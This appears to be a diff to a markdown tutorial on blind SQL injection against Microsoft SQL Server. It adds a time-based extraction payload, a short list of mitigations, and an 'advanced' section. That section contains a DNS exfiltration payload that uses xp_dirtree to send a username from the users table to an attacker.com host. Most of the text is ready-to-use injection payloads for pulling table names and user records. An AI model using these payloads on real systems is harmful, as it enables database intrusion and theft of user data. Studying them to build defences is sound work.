@@ -50,13 +50,13 @@ continue from exploitation process point number 3
      '; IF (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1) = 'a') WAITFOR DELAY '0:0:5' -- 
      ```
 
-3. **Systematically extract information**:
+4. **Systematically extract information**:
    - Database version
    - Table names
    - Column names
    - Actual data records
 
-3. **Automate the process**:
+5. **Automate the process**:
    - Use tools like SQLmap for efficient exploitation
    - Script custom attacks for specific scenarios
 
@@ -66,4 +66,27 @@ continue from exploitation process point number 3
 ' AND (SELECT ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))) > 100 -- 
 ```
 
-## Example Time-Based
+## Example Time-Based Attack Pattern
+
+```sql
+'; IF (SELECT ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))) > 100 WAITFOR DELAY '0:0:5' -- 
+```
+
+## Mitigation Strategies
+
+1. **Use prepared statements with parameterized queries**
+2. **Implement proper input validation**
+3. **Apply principle of least privilege for database accounts**
+4. **Configure proper error handling** (don't reveal database errors)
+5. **Use Web Application Firewalls (WAFs)** to detect and block injection attempts
+
+## Advanced Techniques
+
+- Combine Boolean and Time-based approaches for reliability
+- Use bit-shifting techniques for faster data extraction
+- Exploit DNS exfiltration in restricted environments:
+  ```sql
+  '; DECLARE @data VARCHAR(1024); SELECT @data = (SELECT TOP 1 username FROM users); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"') -- 
+  ```
+
+Remember that Blind SQLi attacks can be time-consuming but are often successful against vulnerable applications that don't properly sanitize input.
